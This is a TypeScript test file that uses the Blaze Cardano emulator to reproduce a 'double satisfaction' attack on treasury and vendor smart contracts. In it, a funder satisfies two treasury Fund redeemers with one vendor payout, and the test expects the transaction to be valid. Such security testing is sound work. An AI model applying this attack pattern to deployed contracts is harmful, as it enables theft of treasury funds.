import { beforeEach, describe, test } from 'bun:test';
import { Core, makeValue } from '@blaze-cardano/sdk';
import * as Data from '@blaze-cardano/data';
import { Emulator, EmulatorProvider } from '@blaze-cardano/emulator';
import {
  disburse_key,
  fund_key,
  Funder,
  reorganize_key,
  sampleTreasuryConfig,
  sampleVendorConfig,
  setupEmulator,
  sweep_key,
} from '../utilities.test';
import {
  coreValueToContractsValue,
  loadTreasuryScript,
  loadVendorScript,
  slot_to_unix,
} from '../../shared';
import {
  ScriptHashRegistry,
  TreasuryConfiguration,
  TreasurySpendRedeemer,
  VendorConfiguration,
  VendorDatum,
} from '../../types/contracts';
import {
  Address,
  AssetId,
  Ed25519KeyHashHex,
  Script,
  Slot,
  toHex,
} from '@blaze-cardano/core';

(BigInt.prototype as any).toJSON = function () {
  return this.toString();
};

describe('Sweep multiple satisfaction attack', () => {
  let emulator: Emulator;
  let treasuryConfig1: TreasuryConfiguration;
  let treasuryConfig2: TreasuryConfiguration;
  let vendorConfig: VendorConfiguration;
  let treasuryScriptAddress1: Address;
  let vendorScriptAddress: Address;
  let treasury1Input: Core.TransactionUnspentOutput;
  let treasury2Input: Core.TransactionUnspentOutput;
  let treasuryRefInput1: Core.TransactionUnspentOutput;
  let treasuryRefInput2: Core.TransactionUnspentOutput;
  let provider: EmulatorProvider;
  let registryInput1: Core.TransactionUnspentOutput;
  let registryInput2: Core.TransactionUnspentOutput;

  const printUtxosAtAddress = async (address: Address) => {
    console.log(
      JSON.stringify(
        (await provider.getUnspentOutputs(address)).map((u) => u.toCore()),
        null,
        2
      )
    );
  };

  function registryTokenAlternative(): [string, string] {
    return [
      '00000000000000000000000000000000000000000000000000000001',
      toHex(Buffer.from('REGISTRY')),
    ];
  }

  async function alternativeTreasuryConfig(
    emulator: Emulator
  ): Promise<TreasuryConfiguration> {
    const [policyId, _] = registryTokenAlternative();
    return {
      registry_token: policyId,
      expiration: slot_to_unix(Slot(30)),
      payout_upperbound: slot_to_unix(Slot(45)),
      permissions: {
        sweep: {
          Signature: {
            key_hash: await sweep_key(emulator),
          },
        },
        disburse: {
          Signature: {
            key_hash: await disburse_key(emulator),
          },
        },
        fund: {
          Signature: {
            key_hash: await fund_key(emulator),
          },
        },
        reorganize: {
          Signature: {
            key_hash: await reorganize_key(emulator),
          },
        },
      },
    };
  }

  beforeEach(async () => {
    emulator = await setupEmulator();
    treasuryConfig1 = await sampleTreasuryConfig(emulator);
    treasuryConfig2 = await alternativeTreasuryConfig(emulator);
    vendorConfig = await sampleVendorConfig(emulator);
    const treasury1 = loadTreasuryScript(
      Core.NetworkId.Testnet,
      treasuryConfig1
    );
    const treasury2 = loadTreasuryScript(
      Core.NetworkId.Testnet,
      treasuryConfig2
    );
    const vendor = loadVendorScript(Core.NetworkId.Testnet, vendorConfig);
    treasuryScriptAddress1 = treasury1.scriptAddress;
    vendorScriptAddress = vendor.scriptAddress;

    await emulator.publishScript(treasury2.script.Script);

    const [registryPolicy2, registryName2] = registryTokenAlternative();
    await emulator.register(
      'Registry',
      makeValue(5_000_000n, [registryPolicy2 + registryName2, 1n]),
      Data.serialize(ScriptHashRegistry, {
        treasury: {
          Script: [treasury2.credential.hash],
        },
        vendor: {
          Script: [vendor.credential.hash],
        },
      })
    );

    treasury1Input = new Core.TransactionUnspentOutput(
      new Core.TransactionInput(Core.TransactionId('1'.repeat(64)), 0n),
      new Core.TransactionOutput(
        treasury1.scriptAddress,
        makeValue(100_000_000n)
      )
    );
    treasury1Input.output().setDatum(Core.Datum.newInlineData(Data.Void()));

    treasury2Input = new Core.TransactionUnspentOutput(
      new Core.TransactionInput(Core.TransactionId('1'.repeat(64)), 1n),
      new Core.TransactionOutput(
        treasury2.scriptAddress,
        makeValue(50_000_000n)
      )
    );
    treasury2Input.output().setDatum(Core.Datum.newInlineData(Data.Void()));

    emulator.addUtxo(treasury1Input);
    emulator.addUtxo(treasury2Input);

    treasuryRefInput1 = emulator.lookupScript(treasury1.script.Script);
    treasuryRefInput2 = emulator.lookupScript(treasury2.script.Script);

    provider = new EmulatorProvider(emulator);
    registryInput1 = await provider.getUnspentOutputByNFT(
      AssetId(treasuryConfig1.registry_token + toHex(Buffer.from('REGISTRY')))
    );
    registryInput2 = await provider.getUnspentOutputByNFT(
      AssetId(treasuryConfig2.registry_token + toHex(Buffer.from('REGISTRY')))
    );
  });

  describe('after the timeout', () => {
    describe('a funder', () => {
      test('steal funds meant to be fund through double satisfaction', async () => {
        await emulator.as(Funder, async (blaze, addr) => {
          const fundVal = makeValue(50_000_000n);
          const vendorDatum: VendorDatum = {
            vendor: {
              Signature: {
                key_hash: await reorganize_key(emulator),
              },
            },
            payouts: [
              {
                maturation: BigInt(treasuryConfig1.expiration - 1n),
                value: coreValueToContractsValue(fundVal),
                status: 'Active',
              },
            ],
          };
          const signer = Ed25519KeyHashHex(await fund_key(emulator));

          printUtxosAtAddress(addr);

          await emulator.expectValidTransaction(
            blaze,
            blaze
              .newTransaction()
              .addRequiredSigner(signer)
              // Fund
              .addInput(
                treasury1Input,
                Data.serialize(TreasurySpendRedeemer, {
                  Fund: {
                    amount: coreValueToContractsValue(fundVal),
                  },
                })
              )
              .addInput(
                treasury2Input,
                Data.serialize(TreasurySpendRedeemer, {
                  Fund: {
                    amount: coreValueToContractsValue(fundVal),
                  },
                })
              )
              .setValidUntil(
                Slot(Number(treasuryConfig1.expiration / 1000n) - 1)
              )
              .addReferenceInput(treasuryRefInput1)
              .addReferenceInput(treasuryRefInput2)
              .addReferenceInput(registryInput1)
              .addReferenceInput(registryInput2)
              .lockAssets(
                vendorScriptAddress,
                fundVal,
                Data.serialize(VendorDatum, vendorDatum)
              )
              .lockAssets(treasuryScriptAddress1, fundVal, Data.Void())
          );
          printUtxosAtAddress(addr);
        });
      });
    });
  });
});
